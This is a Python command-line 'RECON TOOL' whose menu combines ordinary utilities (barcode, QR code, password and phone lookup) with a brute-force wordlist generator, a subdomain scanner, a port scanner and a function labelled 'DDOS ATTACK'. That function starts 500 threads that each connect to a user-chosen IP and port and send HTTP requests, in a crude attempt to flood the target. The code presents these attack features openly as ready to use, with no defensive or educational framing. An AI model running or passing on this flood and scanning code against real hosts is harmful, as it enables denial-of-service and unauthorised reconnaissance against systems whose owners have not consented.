import os
import queue
import time
from tqdm import tqdm
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
import phonenumbers
from phonenumbers import carrier, geocoder
from tabulate import tabulate

# ASCII banner
result = Figlet(font="slant").renderText("RECON TOOL")
print(result)

# Display options
options = """
1- MY IP ADDRESS
2- PASSWORD GENERATOR
3- WORDLIST GENERATOR
4- BARCODE GENERATOR
5- QRCODE GENERATOR
6- PHONE NUMBER INFO
7- SUBDOMAIN SCANNER
8- PORT SCANNER
9- DDOS ATTACK
"""
print(options)

# User selection
select = int(input("Enter your choice: "))


def loading():
    for _ in tqdm(range(100), desc="LOADING...", ascii=False, ncols=75):
        time.sleep(0.01)
    print("LOADING DONE!")


def window_size(columns=80, height=20):
    os.system("cls" if os.name == "nt" else "clear")
    os.system(f'mode con: cols={columns} lines={height}' if os.name == "nt" else '')


def get_ip():
    window_size()
    print(Figlet(font="slant").renderText("Find MY IP ADDRESS"))
    loading()
    hostname = socket.gethostname()
    ipaddr = socket.gethostbyname(hostname)
    print("YOUR DEVICE IP ADDRESS: " + ipaddr)


def password_generator():
    window_size()
    print(Figlet(font="slant").renderText("PASSWORD GENERATOR"))
    loading()
    length = int(input("ENTER THE LENGTH OF THE PASSWORD: "))
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#&*(){}[]/?"
    password = "".join(random.sample(chars, length))
    print(f"GENERATED PASSWORD OF LENGTH {length} is: {password}")


def wordlist_generator():
    window_size()
    print(Figlet(font="slant").renderText("WORDLIST GENERATOR"))
    loading()
    chars = input("ENTER THE LETTERS FOR COMBINATION: ")
    min_len = int(input("MINIMUM LENGTH OF THE PASSWORD: "))
    max_len = int(input("MAXIMUM LENGTH OF THE PASSWORD: "))
    file_name = input("[+] Enter the name of the file: ")
    with open(file_name, 'w') as file:
        for i in range(min_len, max_len + 1):
            for combo in itertools.product(chars, repeat=i):
                file.write(''.join(combo) + '\n')
    print(f"Wordlist saved to {file_name}")


def barcode_generator():
    window_size()
    print(Figlet(font="slant").renderText("BARCODE GENERATOR"))
    loading()
    num = input("Enter a 12-digit number to generate a barcode: ")
    code = EAN13(num, writer=ImageWriter())
    code.save("bar_code")
    print("Barcode saved as 'bar_code.png'")


def qrcode_generator():
    window_size()
    print(Figlet(font="slant").renderText("QRCODE GENERATOR"))
    loading()
    data = input("ENTER THE DATA TO CREATE A QRCODE: ")
    qr_code = pyqrcode.create(data)
    qr_code.png("myqr.png", scale=6)
    print("QR code saved as 'myqr.png'")


def phone_number_info():
    window_size()
    print(Figlet(font="slant").renderText("PHONE NUMBER INFO"))
    loading()
    number = input("Enter the phone number (with country code): ")
    parsed_number = phonenumbers.parse(number)
    country = geocoder.description_for_number(parsed_number, "en")
    carrier_name = carrier.name_for_number(parsed_number, "en")
    print(tabulate([["Country", "Carrier"], [country, carrier_name]], headers="firstrow"))


def subdomain_scanner():
    window_size()
    print(Figlet(font="slant").renderText("SUBDOMAIN SCANNER"))
    loading()
    domain = input("Enter the domain to scan: ")
    with open("subdomain.txt", 'r') as file:
        subdomains = file.read().splitlines()
        for subdomain in subdomains:
            url = f"http://{subdomain}.{domain}"
            try:
                response = requests.get(url)
                if response.status_code == 200:
                    print(f"[+] Subdomain found: {url}")
            except requests.ConnectionError:
                pass


def port_scanner():
    window_size()
    print(Figlet(font="slant").renderText("PORT SCANNER"))
    loading()
    target = input("ENTER IP ADDRESS TO SCAN: ")
    mode = int(input("ENTER PORT SCAN MODE (1-4): "))

    def portscan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            return True
        except:
            return False

    def get_ports():
        if mode == 1:
            return range(1, 1024)
        elif mode == 2:
            return range(1, 49152)
        elif mode == 3:
            return [20, 21, 22, 23, 25, 53, 80, 110, 443]
        else:
            return map(int, input("Enter your ports (separate by spaces): ").split())

    open_ports = []
    for port in get_ports():
        if portscan(port):
            open_ports.append(port)
    print(f"Open ports: {open_ports}")


def ddos_attack():
    window_size()
    print(Figlet(font="slant").renderText("DDOS ATTACK"))
    loading()
    target = input("Enter IP address: ")
    port = int(input("Enter port: "))

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode('ascii'), (target, port))
        finally:
            s.close()

    for _ in range(500):
        threading.Thread(target=attack).start()
    print(f"Started DDOS attack on {target}")


if __name__ == "__main__":
    match select:
        case 1:
            get_ip()
        case 2:
            password_generator()
        case 3:
            wordlist_generator()
        case 4:
            barcode_generator()
        case 5:
            qrcode_generator()
        case 6:
            phone_number_info()
        case 7:
            subdomain_scanner()
        case 8:
            port_scanner()
        case 9:
            ddos_attack()

    input("PRESS ENTER TO EXIT")
